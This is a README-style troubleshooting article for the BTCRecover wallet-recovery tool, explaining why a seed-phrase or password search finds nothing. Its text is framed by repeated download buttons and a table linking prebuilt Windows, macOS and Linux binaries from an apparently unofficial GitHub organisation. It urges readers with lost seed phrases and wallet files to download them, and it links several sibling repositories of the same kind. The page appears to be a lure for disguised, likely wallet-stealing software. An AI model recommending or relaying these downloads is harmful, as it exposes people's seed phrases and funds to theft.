<div align="center">
<img src="assets/banner-article.png" alt="A recovery run that finds nothing: what to check">
</div>

# A recovery run that finds nothing: what to check

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

A finished run with no candidate is a result, not a verdict. It means one of four inputs was wrong  -  the artifact type, the target, the candidate rules, or which positions you declared unknown  -  and each is cheaper to test than the last. BTCRecover prints what it tried, so the output usually names which input failed.

## You'll see this if

The tool ran, reported progress, and reached the end of the space without a match. That is the single most common support question in this field, and it has a short list of causes.

| What you saw | What it usually means | First check |
|---|---|---|
| Ran to completion, no hit, short candidate list | rules excluded the real input | the rule set |
| Ran to completion, no hit, huge space | target or artifact is wrong | the address or file |
| Stopped early with an error about the wallet or format | wrong artifact type | the file, not the rules |
| Progress frozen at the start | target unusable, or the run never began | the target |
| Found a candidate that did not restore | correct arithmetic, wrong wallet branch | derivation and passphrase |
| No output at all | the command, not the recovery, is the problem | the invocation |

## Why it happens

A search is only as good as its inputs, and every input is silent when it is wrong. A wallet file with the wrong target produces no candidates rather than an error. A candidate rule set that assumes a capital letter quietly excludes a password that never had one. A phrase search against an address from a different account is a perfectly correct search of the wrong thing.

The four inputs also fail in a fixed order of cost. Artifact type takes seconds to confirm. The target takes a minute if you have a record. The rules take thought. The declared positions take honesty about what you actually remember. Checking them out of order is how an evening disappears.

There is one case that is not an error at all: a search that genuinely exhausted the space, where the input you are looking for was never in it. That happens with long random passphrases, with a phrase that is wrong in a word you believed was certain, and with wallets the tool does not target. Distinguishing that from a broken setup is the point of this page.

## Fix

Establish what the run actually did, then test the four inputs in ascending order of cost.

1. **Read the end of the output first.** A completion message, an exhausted-space message and an error are three different outcomes and they lead to different checks. Do not rerun until you know which one you got.
2. **Confirm the artifact.** A `wallet.dat` is not an Electrum file and a phrase is not a password. If the artifact is a wallet type the tool does not cover, the run cannot succeed no matter what you change: [Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md).
3. **Confirm the target.** For a phrase search, an address from the wrong account or the wrong address type fails against the correct phrase. For a password search, a file that is not the one you think it is does the same: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
4. **Re-read the rules.** Print the candidate list and look for what it excludes  -  a required digit, a fixed length, a capital letter, a separator that was never there. The commonest bug is a rule that is stricter than the memory it came from.
5. **Re-check the unknown positions.** Two missing words marked as adjacent, when they were not, sends the search into a space that does not contain the answer: [Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md).
6. **Test one variable at a time.** Change the target OR the rules OR the positions, never two at once; otherwise a second failure tells you nothing.
7. **Re-run the current release.** If the run predates the current build, download it from the GitHub releases page and repeat  -  fixes and format handling land between versions: [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1).

## If that did not work

When all four inputs check out and the search still finishes empty, the honest conclusion is that the input is not in the space you searched  -  which is information, not failure.

That leads to constraint-hunting rather than more compute: a second copy of the backup, an old email, a screenshot, a photograph of the paper, a note in a password manager. One confirmed word from a second source can shrink a search by orders of magnitude, and it is a better use of an evening than another run of the same rules. Where the case is a wallet file with an unremembered password, the same logic applies to the password: a fragment recovered from anywhere is worth more than another dictionary pass.

If nothing further exists, saying so plainly is part of the answer. A wallet whose phrase was never written down and whose file no longer exists cannot be recovered by software, and no tool or service changes that. [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md) covers what a successful search looks like so the difference is visible.

## Prevention

- Keep a written record of what each backup is: wallet, year, address, whether a passphrase was set.
- Save the exact command and rule file that worked, next to the backup.
- Re-test one backup a year so a failed restore is discovered while records still exist.
- Record the address, not just the balance  -  the address is what makes a future search checkable.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### BTCRecover ran but did not find my missing words. Is the setup wrong or the search exhausted?

Check the target address first, then the rules, then the declared positions. If all three are right, the search was genuinely exhausted, which usually means a word you are certain of is wrong or the wallet type is not the one you assumed.

### What happens if you lose your Bitcoin wallet password?

The file stays readable but unspendable until the password is reproduced. A partial memory can be searched with candidate rules; a password to an account someone else holds is reset through that provider instead: [wallet.dat password recovery for Bitcoin Core](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/btcrecover-wallet-dat-password-recovery.md).

### Can a run find the wrong answer?

It can find a valid phrase that is not yours, when the checksum passes but the address is from another wallet. That is why every candidate has to be confirmed by restoring it and comparing an address before anything is moved.

### Is it worth running longer?

Only if the space is genuinely large and the inputs are confirmed. Repeating a run with identical rules on identical inputs produces identical output; changing one input is what makes the next run different.

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Recover a seed phrase with 1-3 missing words]([Recover a seed phrase with 1-3 missing words](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-missing-seed-words.md))
- [How to find a lost Bitcoin wallet address]([How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md))
- [Wallets and files BTCRecover does not target]([Wallets and files BTCRecover does not target](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/wallets-btcrecover-does-not-support.md))
